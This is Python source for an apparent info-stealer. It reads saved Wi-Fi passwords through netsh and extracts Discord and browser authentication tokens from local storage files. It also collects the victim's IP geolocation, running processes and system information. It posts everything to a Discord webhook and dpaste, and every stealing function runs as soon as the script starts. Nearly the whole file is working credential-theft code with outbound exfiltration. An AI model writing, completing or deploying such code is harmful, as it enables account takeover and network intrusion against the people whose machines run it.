import subprocess
import os
import re
import json
import requests
from urllib.request import Request, urlopen
from discord_webhook import DiscordWebhook
from requests import get


def wifistealer(): 
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
    profile_names = set(re.findall(r"All User Profile\s*:(.*)", command_output))
    wifi_data = ""
    for profile in profile_names:
        profile = profile.strip()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True).stdout.decode()
        profile_password = re.findall(r"Key Content\s*:(.*)", profile_info)
        if len(profile_password) == 0:
            wifi_data += f"{profile}: Open\n"
        else:
            wifi_data += f"{profile}: {profile_password[0].strip()}\n"

            webhook = DiscordWebhook(
                url='YOUR WEBHOOK URL',
                content=f'{wifi_data}')
            response = webhook.execute()



def dstokenlog():
    WEBHOOK_URL = 'YOUR WEBHOOK URL'

    PING_ME = False 

    def find_tokens(path):
        path += '\\Local Storage\\leveldb'

        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens

    def main():
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        
        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }
        
        message = '@everyone' if PING_ME else ''
        
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            
            message += f'\n**{platform}**\n```\n'
            
            tokens = find_tokens(path)
            
            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                message += 'No tokens found.\n'
            
            message += '```'
        
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }
        
        payload = json.dumps({'content': message})
        
        try:
            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
            urlopen(req)
        except:
            pass

    
    
    if __name__ == '__main__':
        main()



def ipinfos():
    ip1 = get(f'https://api.my-ip.io/ip').text
    ip = get(f'https://ipinfo.io/{ip1}/json').text
    
    webhook = DiscordWebhook(
        url='YOUR WEBHOOK URL',
        content=f'{ip}')
    response = webhook.execute()



def processhax():
    command_output1 = subprocess.run(["tasklist"], capture_output=True).stdout.decode()
    data = {"content": (command_output1), "syntax": "python", "expiry_days": 1}
    headers = {"User-Agent": ""}
    r = requests.post("https://dpaste.com/api/", data=data, headers=headers)
    linkprocss = (f"URL: {r.text}")
    
    webhook = DiscordWebhook(
        url='YOUR WEBHOOK URL',
        content=f'{linkprocss}'
    )
    response = webhook.execute()



def systeminfo():
    command_output4 = subprocess.run(["systeminfo"], capture_output=True).stdout.decode()
    data = {"content": (command_output4), "syntax": "python", "expiry_days": 1}
    headers = {"User-Agent": ""}
    r = requests.post("https://dpaste.com/api/", data=data, headers=headers)
    linkprocss1 = (f"URL: {r.text}")
    webhook = DiscordWebhook(
        url='YOUR WEBHOOK URL',
        content=f'{linkprocss1}'
    )
    response = webhook.execute()

wifistealer()
dstokenlog()
ipinfos()
processhax()
systeminfo()
